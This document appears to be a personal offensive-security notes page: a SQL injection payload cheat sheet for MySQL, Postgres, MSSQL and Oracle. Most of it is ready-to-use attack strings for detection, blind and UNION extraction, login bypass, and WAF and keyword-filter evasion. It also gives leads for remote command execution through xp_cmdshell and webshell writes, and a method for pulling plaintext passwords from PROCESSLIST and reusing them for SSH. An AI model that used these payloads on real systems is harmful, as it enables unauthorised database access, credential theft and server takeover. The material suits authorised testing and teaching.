---
title: "Payloads: SQLi"
type: payloads
tags: [payloads, sqli, web, database]
sources: []
date_created: 2026-06-05
date_updated: 2026-06-29
---

# Payloads: SQLi

Detection + extraction by type. Confirm boolean/time before claiming. See [[sql-injection]].

## Detection
```
'        "        `        \        ')        ;--
1' OR '1'='1        1" OR "1"="1        ' OR 1=1-- -
1 AND 1=1   vs   1 AND 1=2            # boolean diff
```

## Time-based (blind, also SSRF-style confirm)
```
# MySQL
' AND SLEEP(5)-- -            ' OR SLEEP(5)#
# Postgres
'; SELECT pg_sleep(5)-- -
# MSSQL
'; WAITFOR DELAY '0:0:5'-- -
# Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -
```

## Union (column count + extract)
```
' ORDER BY 5-- -                       # find col count
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT 1,version(),database()-- -
' UNION SELECT table_name,2 FROM information_schema.tables-- -
```

## Auth bypass
```
admin'-- -        admin'#        ' OR 1=1 LIMIT 1-- -
```

## Stacked / RCE leads
```
MSSQL: '; EXEC xp_cmdshell 'whoami'-- -
Postgres: COPY ... TO PROGRAM ; large-object / pg_read_file
MySQL: INTO OUTFILE webshell (FILE priv + writable webroot)
```

## WAF bypass
```
/*!50000SELECT*/   UNI/**/ON SE/**/LECT   %0bUNION   SeLeCt   +UNION+ALL+SELECT+
```

## Second-order (test ALL quote contexts)
First-order input (login/register) is often parameterized while the same STORED value is
concatenated unsafely on another page (profile/dashboard/"last logins"). A `'` doing nothing
≠ safe — the sink may be double-quoted. Register the value, then load the page that renders it.
```
# register username = each, log in, view the page that displays it:
"        '        `        ")        "))        " OR "1"="1
# double-quote second-order confirmed when the rendering page throws:  ... near '"""'
```

## Plaintext creds from PROCESSLIST (password hashed inside the query)
App does `... AND pass=md5("PLAINTEXT")` in SQL -> plaintext is in the live query. A bot that
logs in periodically (held by an anti-bruteforce SLEEP) leaves it readable. Same DB user sees
its own threads without PROCESS priv. Output truncates to the sink width -> page it in chunks.
```sql
" UNION SELECT 1,SUBSTRING((SELECT info FROM information_schema.PROCESSLIST
  WHERE id=(SELECT MIN(id) FROM information_schema.PROCESSLIST)),POS,16)-- -   # POS=1,17,33,...
# error-based (~32 chars/error):
" AND extractvalue(1,concat(0x7e,substr((SELECT info FROM information_schema.processlist
  WHERE info LIKE 0x256d643525 LIMIT 1),1,31)))-- -
```
Poll fast, timed to the bot login. Reuse the recovered password for SSH, not just the web app.

Prefer `sqlmap` for extraction once a vector is confirmed (but it won't find second-order or
PROCESSLIST timing — do those manually).

## App keyword-filter bypass + login redirect oracle
Custom PHP blacklist (e.g. `/ or /i  /0x/i  /\*\*/  /sleep/i  /ifnull/i  /-- [a-z0-9]{4}/i`)
returns a fixed "SQL Injection detected" string. Bypass: `AND` logic (not OR), `-- -` comment
(not `/**/`), quoted literals (not `0x`), `CASE WHEN` (not `IFNULL`). With a static post-login
page, the login itself is the boolean oracle:
```sql
recon1' AND 1=1-- -                       # -> 302 success = TRUE
recon1' AND 1=2-- -                       # -> 200 fail    = FALSE
' UNION SELECT NULL,NULL,NULL,NULL-- -    # 302 when UNION col count matches
```
sqlmap FAILS here (hex-encodes data as `0x` -> blocked; follows the 302). Hand-roll a boolean
extractor with `ASCII(SUBSTRING((subq),i,1))>N` and **clear the session cookie each probe** (a
login oracle otherwise stays authenticated -> always true). Full extractor: [[sql-injection]].

## Anti-automation (request-rate) WAF vs the keyword filter

Distinct from the keyword blacklist above: some apps add a REQUEST-FREQUENCY limiter (e.g. ban
after ~10 requests in a short window for 60s, often with a "Try SqlMap.. I dare you" taunt). This
defeats sqlmap by BURST RATE, not by payload content: sqlmap's detection phase trips the ban, and
every response after that measures the ban, not the app (easily misread as "server load / worker
starvation"). Injection is provable by hand, so on this signal do NOT run sqlmap or any parallel
scanner: extract ONE serial request at a time.

- **Test the NUMERIC boolean context first:** `id=1 AND 1=1` (row shows) vs `id=1 AND 1=2` (row
  gone) settles the query shape before you burn turns theorizing quote / `LIKE '%..%'` breakouts.
  A lone `'` that only errors can be the WAF/troll page, not the real query structure.
- **Blocked column NAME** (e.g. `username` on the blacklist -> you cannot `SELECT username`):
  reference blocked table/column names via hex literals for schema
  (`... WHERE table_name=0x7573657273`), and for data just dump the columns that AREN'T blocked
  (the password column alone is usually enough to log in).
- **Reflect through a rendered column:** find which column the page prints with
  `UNION SELECT 1,2,3,4,5` (watch which number appears), then place the payload there and use
  `group_concat(col,0x3a,col2 SEPARATOR 0x7c)` for multi-row/col dumps. Bypass a `'`/`#`/`-` char
  blacklist with functions + hex only (no quotes, no comments).

<!-- promoted-slug: sqli-request-rate-limiter -->
